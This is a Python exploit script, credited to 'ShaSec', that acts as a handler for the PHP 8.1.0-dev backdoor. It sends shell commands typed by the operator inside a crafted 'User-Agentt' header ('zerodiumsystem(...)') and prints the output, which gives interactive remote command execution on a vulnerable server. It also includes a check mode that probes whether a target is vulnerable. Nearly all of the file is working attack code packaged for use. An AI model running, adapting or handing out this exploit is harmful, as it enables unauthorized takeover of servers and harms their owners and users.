#!/usr/bin/python3

import argparse, sys, requests, time
from termcolor import cprint

'''

Dependency free backdoor handler created by ShaSec


USAGE:
	Check for vulnerability: python3 php-8.1.0-dev-rce.py -u <Target-URL> --check
	Exploitation: python3 php-8.1.0-dev-rce.py -u <Target-URL>

EXAMPLES:
	python3 php-8.1.0-dev-rce.py -u http://example.com --check
	python3 php-8.1.0-dev-rce.py -u http://example.com
	python3 php-8.1.0-dev-rce.py -u http://example.com:8080

'''


class Exploit:
	def __init__(self):
		self.printBanner()
		args = self.setupArgs()

		if(args.check == True and args.u != None): self.checkVuln(args.u); sys.exit()
		if(args.u != None): self.exploit(args.u); sys.exit()


		cprint("[ERROR] Invalid args. View the help menu.", "red", attrs=['bold'])
		cprint("[INFO] use -h option.\n", "green", attrs=['bold'])


	def createSession(self):
		session = requests.Session()
		return session


	def verifyUrl(self, session, url):

		cprint("[INFO] Validating Target URL ", "white", attrs=['bold'], end="", flush=True)

		self.loader()

		try:
			res = session.get(url)
			if(res.status_code == 200):
				cprint(" [DONE]", "green", attrs=['bold'])
				return True
			
			cprint("[FAILED]", "red", attrs=['bold'])
			cprint("\n[ERROR] Unexpected status code found: {}.".format(res.status_code), "red", attrs=['bold'])
			cprint("[INFO] Exiting. Bye bye :)\n", "white", attrs=['bold'])
		

		except:
			cprint("[FAILED]", "red", attrs=['bold'])
			cprint("\n[ERROR] Could not reach target.", "red", attrs=['bold'])
			cprint("[INFO] Exiting. Bye bye :)\n", "white", attrs=['bold'])

		sys.exit()



	def exploit(self, url):
		session = self.createSession()
		self.verifyUrl(session, url)

		cprint("[INFO] Attempting to enter shell (CTRL + C to exit)\n\n", "white", attrs=['bold'])

		while 1:
			command = ""

			try:
				cprint("[SHELL] > ", "white", end="", flush=True)
				command = input("")

			except KeyboardInterrupt:
				cprint("\n\n[INFO] Exiting. Bye bye :)\n", "white", attrs=['bold'])
				sys.exit()


			headers = {
				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
				"User-Agentt": "zerodiumsystem('{}');".format(command)
			}

			res = session.get(url, headers=headers)
			output = res.text.split("<!DOCTYPE html>")[0]
			print(output)
		


	def checkVuln(self, url):
		session = self.createSession()
		self.verifyUrl(session, url)

		cprint("[INFO] Checking for vulnerability ", "white", attrs=['bold'], end="", flush=True)
		self.loader()
		cprint(" [DONE]", "green", attrs=['bold'])

		headers = {
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
			"User-Agentt": "zerodiumsystem('');"
		}

		res = session.get(url, headers=headers)
		if("Uncaught ValueError: system()" in res.text):
			cprint("\n\n[WARNING] The application is vulnerable.", "red", attrs=['bold'])

		else:
			cprint("\n\n[RESULT] Vulnerable not found in the application.", "green", attrs=['bold'])

		cprint("[INFO] Exiting. Bye bye :)\n", "white", attrs=['bold'])
		



	def printBanner(self):
		cprint("\n       _         _   ___   _   __         _                        \n  _ __| |_  _ __(_) ( _ ) / | /  \ ___ __| |_____ _____ _ _ __ ___ \n | '_ \ ' \| '_ \_  / _ \_| || () |___/ _` / -_) V /___| '_/ _/ -_)\n | .__/_||_| .__(_) \___(_)_(_)__/    \__,_\___|\_/    |_| \__\___|\n |_|       |_|                                                     \n\n    (-o-o-o- By ShaSec)\n\n", "cyan", attrs=['bold'])


	def setupArgs(self):
		parser = argparse.ArgumentParser(description='A handler for the PHP 8.1.0-dev Backdoor.')
		parser.add_argument('-u', metavar='url', type=str, help='Provide target url.')
		parser.add_argument('--check', action='store_true', help='Check if the target is vulnerable.')
		return parser.parse_args()


	def loader(self):
		for dot in range(10):
			time.sleep(0.3)
			print("..", end="", flush=True)



def main():
	boom = Exploit()


if __name__ == '__main__':
	main()